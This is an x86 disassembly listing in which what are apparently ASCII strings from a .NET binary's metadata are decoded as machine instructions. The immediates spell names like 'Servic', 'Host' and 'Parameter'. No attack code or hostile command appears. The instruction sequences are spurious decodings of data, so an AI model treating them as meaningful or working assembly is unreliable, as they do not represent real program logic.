  4057f1:	outs   dx,BYTE PTR ds:[esi]
  4057f2:	jne    0x405861
  4057f4:	add    BYTE PTR [ebx+0x79],dl
  4057f7:	jae    0x40586d
  4057f9:	gs ins DWORD PTR es:[edi],dx
  4057fb:	cs push ebx
  4057fd:	gs jb  0x405876
  405800:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  405807:	ins    BYTE PTR es:[edi],dx
  405808:	add    BYTE PTR [ebx+0x79],dl
  40580b:	jae    0x405881
  40580d:	gs ins DWORD PTR es:[edi],dx
  40580f:	cs push ebx
  405811:	gs jb  0x40588a
  405814:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  40581b:	ins    BYTE PTR es:[edi],dx
  40581c:	cs inc esp
  40581e:	gs jae 0x405884
  405821:	jb     0x40588c
  405823:	jo     0x405899
  405825:	imul   ebp,DWORD PTR [edi+0x6e],0x65534900
  40582c:	jb     0x4058a4
  40582e:	imul   esp,DWORD PTR [ebx+0x65],0x61686542
  405835:	jbe    0x4058a0
  405837:	outs   dx,DWORD PTR ds:[esi]
  405838:	jb     0x40583a
  40583a:	push   ebx
  40583b:	jns    0x4058b0
  40583d:	je     0x4058a4
  40583f:	ins    DWORD PTR es:[edi],dx
  405840:	cs push ebx
  405842:	gs jb  0x4058bb
  405845:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  40584c:	ins    BYTE PTR es:[edi],dx
  40584d:	cs inc esp
  40584f:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  405856:	gs jb  0x405859
  405859:	dec    ecx
  40585a:	inc    esp
  40585b:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  405862:	dec    ebp
  405863:	gs jae 0x4058d9
  405866:	popa   
  405867:	addr16 gs dec ecx
  40586a:	outs   dx,BYTE PTR ds:[esi]
  40586b:	jae    0x4058dd
  40586d:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  405872:	add    BYTE PTR [ebp+0x69],cl
  405875:	arpl   WORD PTR [edx+0x6f],si
  405878:	jae    0x4058e9
  40587a:	data16 je 0x4058ab
  40587d:	push   edx
  40587e:	gs jo  0x4058f0
  405881:	jb     0x4058f7
  405883:	imul   ebp,DWORD PTR [esi+0x67],0x76726553
  40588a:	imul   esp,DWORD PTR [ebx+0x65],0x65522e73
  405891:	jo     0x405902
  405893:	jb     0x405909
  405895:	push   eax
  405896:	jb     0x4058fd
  405898:	jbe    0x405903
  40589a:	gs ja  0x40589d
  40589d:	dec    ebp
  40589e:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4058a5:	je     0x4058d5
  4058a7:	push   edx
  4058a8:	gs jo  0x40591a
  4058ab:	jb     0x405921
  4058ad:	imul   ebp,DWORD PTR [esi+0x67],0x6f4c4900
  4058b4:	arpl   WORD PTR [ecx+0x6c],sp
  4058b7:	inc    ebx
  4058b8:	popa   
  4058b9:	je     0x40591c
  4058bb:	ins    BYTE PTR es:[edi],dx
  4058bc:	outs   dx,DWORD PTR ds:[esi]
  4058bd:	add    BYTE PTR [bx+di+0x44],cl
  4058c1:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  4058c8:	ins    BYTE PTR es:[edi],dx
  4058c9:	add    BYTE PTR gs:[esi+0x65],dl
  4058cd:	jb     0x405942
  4058cf:	imul   ebp,DWORD PTR [edi+0x6e],0x69727453
  4058d6:	outs   dx,BYTE PTR ds:[esi]
  4058d7:	add    BYTE PTR [di+0x61],cl
  4058db:	push   0x6f
  4058dd:	jb     0x405935
  4058df:	gs jb  0x405955
  4058e2:	imul   ebp,DWORD PTR [edi+0x6e],0x6e694d00
  4058e9:	outs   dx,DWORD PTR ds:[esi]
  4058ea:	jb     0x405942
  4058ec:	gs jb  0x405962
  4058ef:	imul   ebp,DWORD PTR [edi+0x6e],0x69754200
  4058f6:	ins    BYTE PTR es:[edi],dx
  4058f7:	fs push esi
  4058f9:	gs jb  0x40596f
  4058fc:	imul   ebp,DWORD PTR [edi+0x6e],0x4c505300
  405903:	gs jbe 0x40596b
  405906:	ins    BYTE PTR es:[edi],dx
  405907:	add    BYTE PTR [eax+0x72],dl
  40590a:	outs   dx,DWORD PTR ds:[esi]
  40590b:	fs jne 0x405971
  40590e:	je     0x405966
  405910:	gs jb  0x405986
  405913:	imul   ebp,DWORD PTR [edi+0x6e],0x69727453
  40591a:	outs   dx,BYTE PTR ds:[esi]
  40591b:	add    BYTE PTR [bx+si+0x72],dl
  40591f:	outs   dx,DWORD PTR ds:[esi]
  405920:	fs jne 0x405986
  405923:	je     0x405973
  405925:	popa   
  405926:	ins    DWORD PTR es:[edi],dx
  405927:	gs push ebx
  405929:	je     0x40599d
  40592b:	imul   ebp,DWORD PTR [esi+0x67],0x6c715300
  405932:	inc    ebp
  405933:	outs   dx,BYTE PTR ds:[esi]
  405934:	imul   ebp,DWORD PTR [bp+0x65],0x67617355
  40593c:	gs dec ebp
  40593e:	gs je  0x4059b3
  405941:	imul   esp,DWORD PTR [ebx+0x73],0x656c6f52
  405948:	inc    edi
  405949:	jne    0x4059b4
  40594b:	fs push ebx
  40594d:	je     0x4059c1
  40594f:	imul   ebp,DWORD PTR [esi+0x67],0x6f725000
  405956:	fs jne 0x4059bc
  405959:	je     0x4059a9
  40595b:	popa   
  40595c:	ins    DWORD PTR es:[edi],dx
  40595d:	gs inc edx
  40595f:	jb     0x4059c2
  405961:	outs   dx,BYTE PTR ds:[esi]
  405962:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69727453
  40596a:	outs   dx,BYTE PTR ds:[esi]
  40596b:	add    BYTE PTR [si+0x6f],cl
  40596f:	outs   dx,BYTE PTR ds:[esi]
  405970:	addr16 push eax
  405972:	jb     0x4059e3
  405974:	fs jne 0x4059da
  405977:	je     0x4059c7
  405979:	popa   
  40597a:	ins    DWORD PTR es:[edi],dx
  40597b:	gs inc edx
  40597d:	jb     0x4059e0
  40597f:	outs   dx,BYTE PTR ds:[esi]
  405980:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69727453
  405988:	outs   dx,BYTE PTR ds:[esi]
  405989:	add    BYTE PTR [bx+si+0x72],dl
  40598d:	outs   dx,DWORD PTR ds:[esi]
  40598e:	fs jne 0x4059f4
  405991:	je     0x4059e1
  405993:	popa   
  405994:	ins    DWORD PTR es:[edi],dx
  405995:	gs push ebx
  405997:	push   0x6374726f
  40599c:	jne    0x405a12
  40599e:	inc    edx
  40599f:	jb     0x405a02
  4059a1:	outs   dx,BYTE PTR ds:[esi]
  4059a2:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69727453
  4059aa:	outs   dx,BYTE PTR ds:[esi]
  4059ab:	add    BYTE PTR [bp+0x65],dl
  4059af:	jb     0x405a24
  4059b1:	imul   ebp,DWORD PTR [edi+0x6e],0x61636f4c
  4059b8:	je     0x405a23
  4059ba:	outs   dx,DWORD PTR ds:[esi]
  4059bb:	outs   dx,BYTE PTR ds:[esi]
  4059bc:	push   ebx
  4059bd:	je     0x405a31
  4059bf:	imul   ebp,DWORD PTR [esi+0x67],0x6f725000
  4059c6:	fs jne 0x405a2c
  4059c9:	je     0x405a21
  4059cb:	gs jb  0x405a41
  4059ce:	imul   ebp,DWORD PTR [edi+0x6e],0x61636f4c
  4059d5:	je     0x405a40
  4059d7:	outs   dx,DWORD PTR ds:[esi]
  4059d8:	outs   dx,BYTE PTR ds:[esi]
  4059d9:	push   ebx
  4059da:	je     0x405a4e
  4059dc:	imul   ebp,DWORD PTR [esi+0x67],0x72655600
  4059e3:	jae    0x405a4e
  4059e5:	outs   dx,DWORD PTR ds:[esi]
  4059e6:	outs   dx,BYTE PTR ds:[esi]
  4059e7:	dec    eax
  4059e8:	gs ins BYTE PTR es:[edi],dx
  4059ea:	jo     0x405a37
  4059ec:	gs jns 0x405a66
  4059ef:	outs   dx,DWORD PTR ds:[esi]
  4059f0:	jb     0x405a56
  4059f2:	push   eax
  4059f3:	jb     0x405a5a
  4059f5:	imul   di,WORD PTR [eax+0x0],0x6556
  4059fb:	jb     0x405a70
  4059fd:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  405a04:	push   ebx
  405a05:	gs je  0x405a7c
  405a08:	imul   ebp,DWORD PTR [esi+0x67],0x6b6f5473
  405a0f:	outs   dx,BYTE PTR gs:[esi]
  405a11:	add    BYTE PTR [ebx+0x65],dl
  405a14:	je     0x405a8b
  405a16:	jo     0x405a6b
  405a18:	jne    0x405a8a
  405a1a:	jo     0x405a8b
  405a1c:	jb     0x405a92
  405a1e:	inc    esi
  405a1f:	outs   dx,DWORD PTR ds:[esi]
  405a20:	ins    BYTE PTR es:[edi],dx
  405a21:	fs gs jb 0x405a25
  405a25:	push   eax
  405a26:	jb     0x405a97
  405a28:	fs jne 0x405a8e
  405a2b:	je     0x405a79
  405a2d:	imul   esp,DWORD PTR [ebx+0x65],0x4665736e
  405a34:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x646f7250
  405a3c:	jne    0x405aa1
  405a3e:	je     0x405a95
  405a40:	jo     0x405aa6
  405a42:	popa   
  405a43:	je     0x405aaa
  405a45:	inc    ebx
  405a46:	popa   
  405a47:	je     0x405aae
  405a49:	outs   dx,DWORD PTR ds:[si]
  405a4b:	jb     0x405ac6
  405a4d:	add    BYTE PTR [ebx+0x71],dl
  405a50:	ins    BYTE PTR es:[edi],dx
  405a51:	push   eax
  405a52:	jb     0x405ac3
  405a54:	fs jne 0x405aba
  405a57:	je     0x405a9f
  405a59:	popa   
  405a5a:	ins    DWORD PTR es:[edi],dx
  405a5b:	imul   ebp,DWORD PTR [ecx+edi*2+0x43],0x65646f
  405a63:	push   eax
  405a64:	jb     0x405ad5
  405a66:	fs jne 0x405acc
  405a69:	je     0x405aaf
  405a6b:	imul   esi,DWORD PTR [ebx+0x63],0x7265766f
  405a72:	jns    0x405abd
  405a74:	add    BYTE PTR fs:[ebx+0x71],dl
  405a78:	ins    BYTE PTR es:[edi],dx
  405a79:	dec    ecx
  405a7a:	outs   dx,BYTE PTR ds:[esi]
  405a7b:	jae    0x405af1
  405a7d:	popa   
  405a7e:	outs   dx,BYTE PTR ds:[esi]
  405a7f:	arpl   WORD PTR [ebp+0x49],sp
  405a82:	inc    esp
  405a83:	push   eax
  405a84:	jb     0x405aeb
  405a86:	imul   di,WORD PTR [eax+0x0],0x7341
  405a8c:	dec    ecx
  405a8d:	outs   dx,BYTE PTR ds:[esi]
  405a8e:	jae    0x405b04
  405a90:	popa   
  405a91:	outs   dx,BYTE PTR ds:[esi]
  405a92:	arpl   WORD PTR [ebp+0x49],sp
  405a95:	inc    esp
  405a96:	push   eax
  405a97:	jb     0x405afe
  405a99:	imul   di,WORD PTR [eax+0x0],0x7352
  405a9f:	dec    ecx
  405aa0:	outs   dx,BYTE PTR ds:[esi]
  405aa1:	jae    0x405b17
  405aa3:	popa   
  405aa4:	outs   dx,BYTE PTR ds:[esi]
  405aa5:	arpl   WORD PTR [ebp+0x49],sp
  405aa8:	inc    esp
  405aa9:	push   eax
  405aaa:	jb     0x405b11
  405aac:	imul   di,WORD PTR [eax+0x0],0x614d
  405ab2:	js     0x405b01
  405ab4:	popa   
  405ab5:	imul   ebp,DWORD PTR [esi+0x74],0x6e616e65
  405abc:	arpl   WORD PTR [ebp+0x56],sp
  405abf:	gs jb  0x405b35
  405ac2:	imul   ebp,DWORD PTR [edi+0x6e],0x61766500
  405ac9:	ins    BYTE PTR es:[edi],dx
  405aca:	push   esp
  405acb:	imul   ebp,DWORD PTR [ebp+0x65],0x626d6f42
  405ad2:	push   esi
  405ad3:	popa   
  405ad4:	ins    BYTE PTR es:[edi],dx
  405ad5:	jne    0x405b3c
  405ad7:	add    BYTE PTR [ebx+0x75],ah
  405ada:	jb     0x405b4e
  405adc:	outs   dx,BYTE PTR gs:[esi]
  405ade:	je     0x405b32
  405ae0:	gs ins BYTE PTR es:[edi],dx
  405ae2:	gs popa 
  405ae4:	jae    0x405b4b
  405ae6:	push   esp
  405ae7:	imul   ebp,DWORD PTR [ebp+0x65],0x626d6f42
  405aee:	push   esi
  405aef:	popa   
  405af0:	ins    BYTE PTR es:[edi],dx
  405af1:	jne    0x405b58
  405af3:	add    BYTE PTR [edi+0x65],dl
  405af6:	jb     0x405b3d
  405af8:	jbe    0x405b5f
  405afa:	outs   dx,BYTE PTR ds:[esi]
  405afb:	je     0x405b4b
  405afd:	popa   
  405afe:	ins    DWORD PTR es:[edi],dx
  405aff:	gs push ebx
  405b01:	gs je  0x405b79
  405b04:	jo     0x405b53
  405b06:	jae    0x405b71
  405b08:	add    BYTE PTR [edi+0x65],dl
  405b0b:	jb     0x405b52
  405b0d:	jbe    0x405b74
  405b0f:	outs   dx,BYTE PTR ds:[esi]
  405b10:	je     0x405b60
  405b12:	popa   
  405b13:	ins    DWORD PTR es:[edi],dx
  405b14:	gs push ebx
  405b16:	gs je  0x405b8e
  405b19:	jo     0x405b5e
  405b1b:	outs   dx,DWORD PTR ds:[esi]
  405b1c:	outs   dx,BYTE PTR ds:[esi]
  405b1d:	imul   sp,WORD PTR [edi+0x0],0x5341
  405b23:	push   ebp
  405b24:	jae    0x405b87
  405b26:	addr16 gs dec ebp
  405b29:	gs je  0x405b9e
  405b2c:	imul   esp,DWORD PTR [ebx+0x73],0x656c6f52
  405b33:	inc    edi
  405b34:	jne    0x405b9f
  405b36:	fs push ebx
  405b38:	je     0x405bac
  405b3a:	imul   ebp,DWORD PTR [esi+0x67],0x72655600
  405b41:	jae    0x405bac
  405b43:	outs   dx,DWORD PTR ds:[esi]
  405b44:	outs   dx,BYTE PTR ds:[esi]
  405b45:	inc    edx
  405b46:	dec    ecx
  405b47:	inc    esp
  405b48:	push   ebx
  405b49:	dec    eax
  405b4a:	gs ins BYTE PTR es:[edi],dx
  405b4c:	jo     0x405b9c
  405b4e:	popa   
  405b4f:	ins    DWORD PTR es:[edi],dx
  405b50:	gs jae 0x405bc3
  405b53:	popa   
  405b54:	arpl   WORD PTR [ebp+0x0],sp
  405b57:	push   esi
  405b58:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  405b5f:	jne    0x405bc5
  405b61:	imul   ebp,DWORD PTR [edi+0x53],0x6c6c6568
  405b68:	push   esi
  405b69:	gs jb  0x405bdf
  405b6c:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  405b73:	pop    edi
  405b74:	push   esi
  405b75:	gs jb  0x405beb
  405b78:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  405b7f:	dec    esi
  405b80:	popa   
  405b81:	ins    DWORD PTR es:[edi],dx
  405b82:	gs jae 0x405bf5
  405b85:	popa   
  405b86:	arpl   WORD PTR [ebp+0x0],sp
  405b89:	push   esi
  405b8a:	gs jb  0x405c00
  405b8d:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  405b94:	dec    esi
  405b95:	popa   
  405b96:	ins    DWORD PTR es:[edi],dx
  405b97:	gs jae 0x405c0a
  405b9a:	popa   
  405b9b:	arpl   WORD PTR [ebp+0x0],sp
  405b9e:	push   ebx
  405b9f:	push   ecx
  405ba0:	dec    esp
  405ba1:	push   esp
  405ba2:	gs jae 0x405c19
  405ba5:	dec    ebx
  405ba6:	gs jns 0x405ba9
  405ba9:	push   ebx
  405baa:	push   ecx
  405bab:	dec    esp
  405bac:	push   esp
  405bad:	gs jae 0x405c24
  405bb0:	dec    ebx
  405bb1:	gs jns 0x405c08
  405bb4:	outs   dx,DWORD PTR ds:[esi]
  405bb5:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  405bb9:	push   ebx
  405bba:	push   ecx
  405bbb:	dec    esp
  405bbc:	push   eax
  405bbd:	jne    0x405c21
  405bbf:	ins    BYTE PTR es:[edi],dx
  405bc0:	imul   esp,DWORD PTR [ebx+0x4b],0x53007965
  405bc7:	push   ecx
  405bc8:	dec    esp
  405bc9:	push   eax
  405bca:	jne    0x405c2e
  405bcc:	ins    BYTE PTR es:[edi],dx
  405bcd:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  405bd4:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  405bd8:	push   eax
  405bd9:	jne    0x405c3d
  405bdb:	ins    BYTE PTR es:[edi],dx
  405bdc:	imul   esp,DWORD PTR [ebx+0x4b],0x50007965
  405be3:	jne    0x405c47
  405be5:	ins    BYTE PTR es:[edi],dx
  405be6:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  405bed:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  405bf1:	inc    ecx
  405bf2:	jae    0x405c67
  405bf4:	gs ins DWORD PTR es:[edi],dx
  405bf6:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  405bfa:	gs jb  0x405c70
  405bfd:	imul   ebp,DWORD PTR [edi+0x6e],0x73734100
  405c04:	gs ins DWORD PTR es:[edi],dx
  405c06:	bound  ebp,QWORD PTR [ecx+edi*2+0x51]
  405c0a:	jne    0x405c6d
  405c0c:	ins    BYTE PTR es:[edi],dx
  405c0d:	imul   esp,DWORD PTR [esi+0x69],0x43007265
  405c14:	outs   dx,DWORD PTR ds:[esi]
  405c15:	ins    DWORD PTR es:[edi],dx
  405c16:	ins    DWORD PTR es:[edi],dx
  405c17:	popa   
  405c18:	outs   dx,BYTE PTR ds:[esi]
  405c19:	fs dec esp
  405c1b:	imul   ebp,DWORD PTR [esi+0x65],0x6e69614d
  405c22:	add    BYTE PTR [esi],ch
  405c24:	arpl   WORD PTR [edi+ebp*2+0x72],si
  405c28:	add    BYTE PTR [eax+0x61],dl
  405c2b:	jb     0x405ca0
  405c2d:	gs inc ebx
  405c2f:	outs   dx,DWORD PTR ds:[esi]
  405c30:	ins    DWORD PTR es:[edi],dx
  405c31:	ins    DWORD PTR es:[edi],dx
  405c32:	popa   
  405c33:	outs   dx,BYTE PTR ds:[esi]
  405c34:	fs dec esp
  405c36:	imul   ebp,DWORD PTR [esi+0x65],0x64644100
  405c3d:	inc    ebx
  405c3e:	outs   dx,DWORD PTR ds:[esi]
  405c3f:	ins    DWORD PTR es:[edi],dx
  405c40:	ins    DWORD PTR es:[edi],dx
  405c41:	popa   
  405c42:	outs   dx,BYTE PTR ds:[esi]
  405c43:	fs dec esp
  405c45:	imul   ebp,DWORD PTR [esi+0x65],0x61726150
  405c4c:	ins    DWORD PTR es:[edi],dx
  405c4d:	gs je  0x405cb5
  405c50:	jb     0x405c52
  405c52:	push   eax
  405c53:	outs   dx,DWORD PTR ds:[esi]
  405c54:	jae    0x405cca
  405c56:	push   eax
  405c57:	popa   
  405c58:	jb     0x405ccd
  405c5a:	gs push esi
  405c5c:	popa   
  405c5d:	ins    BYTE PTR es:[edi],dx
  405c5e:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e6f69
  405c66:	dec    ecx
  405c67:	outs   dx,BYTE PTR ds:[esi]
  405c68:	jae    0x405cde
  405c6a:	popa   
  405c6b:	outs   dx,BYTE PTR ds:[esi]
  405c6c:	arpl   WORD PTR [ebp+0x4d],sp
  405c6f:	popa   
  405c70:	imul   ebp,DWORD PTR [esi+0x0],0x6974704f
  405c77:	outs   dx,DWORD PTR ds:[esi]
  405c78:	outs   dx,BYTE PTR ds:[esi]
  405c79:	dec    eax
  405c7a:	popa   
  405c7b:	outs   dx,BYTE PTR ds:[esi]
  405c7c:	fs ins BYTE PTR es:[edi],dx
  405c7e:	gs jb  0x405c81
  405c81:	addr16 gs je 0x405ce4
  405c85:	push   ebp
  405c86:	jae    0x405ce9
  405c88:	add    BYTE PTR gs:[di+0x5f],ch
  405c8d:	jo     0x405d01
  405c8f:	imul   ebp,DWORD PTR [esi+0x74],0x63617254
  405c96:	add    BYTE PTR gs:[edi+0x65],ah
  405c9a:	je     0x405cfb
  405c9c:	push   eax
  405c9d:	jb     0x405d08
  405c9f:	outs   dx,BYTE PTR ds:[esi]
  405ca0:	je     0x405cf6
  405ca2:	jb     0x405d05
  405ca4:	arpl   WORD PTR [ebp+0x4f],sp
  405ca7:	outs   dx,BYTE PTR ds:[esi]
  405ca8:	inc    ebp
  405ca9:	jb     0x405d1d
  405cab:	outs   dx,DWORD PTR ds:[esi]
  405cac:	jb     0x405cae
  405cae:	jae    0x405d15
  405cb0:	je     0x405d11
  405cb2:	push   eax
  405cb3:	jb     0x405d1e
  405cb5:	outs   dx,BYTE PTR ds:[esi]
  405cb6:	je     0x405d0c
  405cb8:	jb     0x405d1b
  405cba:	arpl   WORD PTR [ebp+0x4f],sp
  405cbd:	outs   dx,BYTE PTR ds:[esi]
  405cbe:	inc    ebp
  405cbf:	jb     0x405d33
  405cc1:	outs   dx,DWORD PTR ds:[esi]
  405cc2:	jb     0x405cc4
  405cc4:	ins    DWORD PTR es:[edi],dx
  405cc5:	pop    edi
  405cc6:	outs   dx,DWORD PTR ds:[esi]
  405cc7:	jo     0x405d3d
  405cc9:	imul   ebp,DWORD PTR [edi+0x6e],0x70755373
  405cd0:	jo     0x405d41
  405cd2:	jb     0x405d48
  405cd4:	gs add BYTE PTR fs:[edi+0x70],cl
  405cd9:	je     0x405d44
  405cdb:	outs   dx,DWORD PTR ds:[esi]
  405cdc:	outs   dx,BYTE PTR ds:[esi]
  405cdd:	inc    ebx
  405cde:	outs   dx,DWORD PTR ds:[esi]
  405cdf:	outs   dx,BYTE PTR ds:[esi]
  405ce0:	je     0x405d43
  405ce2:	imul   ebp,DWORD PTR [esi+0x73],0x61735500
  405ce9:	add    BYTE PTR gs:[bx+si+0x72],dl
  405cee:	imul   ebp,DWORD PTR [esi+0x74],0x63617254
  405cf5:	gs dec edi
  405cf7:	outs   dx,BYTE PTR ds:[esi]
  405cf8:	inc    ebp
  405cf9:	jb     0x405d6d
  405cfb:	outs   dx,DWORD PTR ds:[esi]
  405cfc:	jb     0x405cfe
  405cfe:	jbe    0x405d61
  405d00:	ins    BYTE PTR es:[edi],dx
  405d01:	jne    0x405d68
  405d03:	pop    edi
  405d04:	pop    edi
  405d05:	add    BYTE PTR [esi+0x6f],cl
  405d08:	outs   dx,BYTE PTR ds:[esi]
  405d09:	add    BYTE PTR gs:[ebx+0x69],dl
  405d0d:	outs   dx,BYTE PTR ds:[esi]
  405d0e:	ins    BYTE PTR es:[di],dx
  405d10:	add    BYTE PTR gs:[ebp+0x75],cl
  405d14:	ins    BYTE PTR es:[edi],dx
  405d15:	je     0x405d80
  405d17:	add    BYTE PTR [esi+0x61],dl
  405d1a:	ins    BYTE PTR es:[edi],dx
  405d1b:	jne    0x405d82
  405d1d:	ins    BYTE PTR es:[edi],dx
  405d1e:	gs jae 0x405d94
  405d21:	add    BYTE PTR [ebx+0x79],dl
  405d24:	jae    0x405d9a
  405d26:	gs ins DWORD PTR es:[edi],dx
  405d28:	cs inc edi
  405d2a:	ins    BYTE PTR es:[edi],dx
  405d2b:	outs   dx,DWORD PTR ds:[esi]
  405d2c:	bound  esp,QWORD PTR [ecx+0x6c]
  405d2f:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  405d36:	add    BYTE PTR [ebx+0x75],al
  405d39:	ins    BYTE PTR es:[edi],dx
  405d3a:	je     0x405db1
  405d3c:	jb     0x405da3
  405d3e:	dec    ecx
  405d3f:	outs   dx,BYTE PTR ds:[esi]
  405d40:	outs   dx,WORD PTR ds:[esi]
  405d42:	add    BYTE PTR [edi+0x65],ah
  405d45:	je     0x405da6
  405d47:	inc    ebx
  405d48:	jne    0x405db6
  405d4a:	je     0x405dc1
  405d4c:	jb     0x405db3
  405d4e:	add    BYTE PTR [ebx+0x65],dh
  405d51:	je     0x405db2
  405d53:	inc    ebx
  405d54:	jne    0x405dc2
  405d56:	je     0x405dcd
  405d58:	jb     0x405dbf
  405d5a:	add    BYTE PTR [ecx+0x6e],cl
  405d5d:	jbe    0x405dc0
  405d5f:	ins    BYTE PTR es:[edi],dx
  405d60:	imul   esp,DWORD PTR [ebx+eax*2+0x6f],0x6e616d6d
  405d68:	fs dec esp
  405d6a:	imul   ebp,DWORD PTR [esi+0x65],0x6974704f
  405d71:	outs   dx,DWORD PTR ds:[esi]
  405d72:	outs   dx,BYTE PTR ds:[esi]
  405d73:	add    BYTE PTR [ebp+esi*2+0x70],al
  405d77:	ins    BYTE PTR es:[edi],dx
  405d78:	imul   esp,DWORD PTR [ebx+0x61],0x6f436574
  405d7f:	ins    DWORD PTR es:[edi],dx
  405d80:	ins    DWORD PTR es:[edi],dx
  405d81:	popa   
  405d82:	outs   dx,BYTE PTR ds:[esi]
  405d83:	fs dec esp
  405d85:	imul   ebp,DWORD PTR [esi+0x65],0x6974704f
  405d8c:	outs   dx,DWORD PTR ds:[esi]
  405d8d:	outs   dx,BYTE PTR ds:[esi]
  405d8e:	add    BYTE PTR [ebp+0x69],cl
  405d91:	jae    0x405e06
  405d93:	imul   ebp,DWORD PTR [esi+0x67],0x6974704f
  405d9a:	outs   dx,DWORD PTR ds:[esi]
  405d9b:	outs   dx,BYTE PTR ds:[esi]
  405d9c:	push   esi
  405d9d:	popa   
  405d9e:	ins    BYTE PTR es:[edi],dx
  405d9f:	jne    0x405e06
  405da1:	add    BYTE PTR [edi+0x65],ah
  405da4:	je     0x405e05
  405da6:	push   ebx
  405da7:	jne    0x405e0c
  405da9:	arpl   WORD PTR [ebp+0x73],sp
  405dac:	jae    0x405e14
  405dae:	jne    0x405e1c
  405db0:	inc    ebp
  405db1:	js     0x405e18
  405db3:	arpl   WORD PTR [ebp+0x74],si
  405db6:	imul   ebp,DWORD PTR [edi+0x6e],0x6c754300
  405dbd:	je     0x405e34
  405dbf:	jb     0x405e26
  405dc1:	add    BYTE PTR [ebx+0x75],dl
  405dc4:	arpl   WORD PTR [ebx+0x65],sp
  405dc7:	jae    0x405e3c
  405dc9:	data16 jne 0x405e38
  405dcc:	inc    ebp
  405dcd:	js     0x405e34
  405dcf:	arpl   WORD PTR [ebp+0x74],si
  405dd2:	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
  405dd9:	je     0x405e40
  405ddb:	ins    DWORD PTR es:[edi],dx
  405ddc:	cs push edx
  405dde:	gs jae 0x405e50
  405de1:	jne    0x405e55
  405de3:	arpl   WORD PTR [ebp+0x73],sp
  405de6:	add    BYTE PTR [edx+0x65],dl
  405de9:	jae    0x405e5a
  405deb:	jne    0x405e5f
  405ded:	arpl   WORD PTR [ebp+0x4d],sp
  405df0:	popa   
  405df1:	outs   dx,BYTE PTR ds:[esi]
  405df2:	popa   
  405df3:	addr16 gs jb 0x405df7
  405df7:	jb     0x405e5e
  405df9:	jae    0x405e6a
  405dfb:	jne    0x405e6f
  405dfd:	arpl   WORD PTR [ebp+0x4d],sp
  405e00:	popa   
  405e01:	outs   dx,BYTE PTR ds:[esi]
  405e02:	popa   
  405e03:	addr16 gs jb 0x405e07
  405e07:	arpl   WORD PTR [ebp+0x6c],si
  405e0a:	je     0x405e81
  405e0c:	jb     0x405e73
  405e0e:	add    BYTE PTR [edi+0x65],al
  405e11:	je     0x405e66
  405e13:	je     0x405e87
  405e15:	imul   ebp,DWORD PTR [esi+0x67],0x695f6d00
  405e1c:	outs   dx,BYTE PTR ds:[esi]
  405e1d:	jae    0x405e93
  405e1f:	popa   
  405e20:	outs   dx,BYTE PTR ds:[esi]
  405e21:	arpl   WORD PTR [ebp+0x0],sp
  405e24:	push   ebx
  405e25:	jns    0x405e9a
  405e27:	je     0x405e8e
  405e29:	ins    DWORD PTR es:[edi],dx
  405e2a:	cs push esp
  405e2c:	push   0x64616572
  405e31:	imul   ebp,DWORD PTR [esi+0x67],0x6e614d00
  405e38:	jne    0x405e9b
  405e3a:	ins    BYTE PTR es:[edi],dx
  405e3b:	push   edx
  405e3c:	gs jae 0x405ea4
  405e3f:	je     0x405e86
  405e41:	jbe    0x405ea8
  405e43:	outs   dx,BYTE PTR ds:[esi]
  405e44:	je     0x405e46
  405e46:	ins    DWORD PTR es:[edi],dx
  405e47:	pop    edi
  405e48:	jae    0x405eb2
  405e4a:	jne    0x405ec0
  405e4c:	outs   dx,DWORD PTR fs:[esi]
  405e4e:	ja     0x405ebe
  405e50:	inc    edi
  405e51:	jne    0x405eb4
  405e53:	jb     0x405eb9
  405e55:	add    BYTE PTR [ebp+0x5f],ch
  405e58:	jae    0x405ece
  405e5a:	popa   
  405e5b:	jb     0x405ed1
  405e5d:	jne    0x405ecf
  405e5f:	push   ebx
  405e60:	gs ins DWORD PTR es:[edi],dx
  405e62:	popa   
  405e63:	jo     0x405ecd
  405e65:	outs   dx,DWORD PTR ds:[esi]
  405e66:	jb     0x405ecd
  405e68:	dec    esi
  405e69:	popa   
  405e6a:	ins    DWORD PTR es:[edi],dx
  405e6b:	add    BYTE PTR gs:[ebp+0x61],cl
  405e6f:	imul   ebp,DWORD PTR [esi+0x0],0x76726553
  405e76:	imul   esp,DWORD PTR [ebx+0x65],0x74736f48
  405e7d:	add    BYTE PTR [ebx+0x72],al
  405e80:	gs popa 
  405e82:	je     0x405ee9
  405e84:	inc    ecx
  405e85:	jo     0x405ef7
  405e87:	dec    ebp
  405e88:	popa   
  405e89:	outs   dx,BYTE PTR ds:[esi]
  405e8a:	popa   
  405e8b:	gs ins DWORD PTR es:[di],dx
  405e8e:	outs   dx,BYTE PTR gs:[esi]
  405e90:	je     0x405ee5
  405e92:	gs jb  0x405f0b
  405e95:	imul   esp,DWORD PTR [ebx+0x65],0x74736f48
  405e9c:	add    BYTE PTR [ebx+0x72],al
  405e9f:	gs popa 
  405ea1:	je     0x405f08
  405ea3:	push   eax
  405ea4:	jb     0x405f15
  405ea6:	arpl   WORD PTR [ebp+0x73],sp
  405ea9:	jae    0x405f14
  405eab:	outs   dx,BYTE PTR ds:[esi]
  405eac:	addr16 push ebx
  405eae:	gs jb  0x405f27
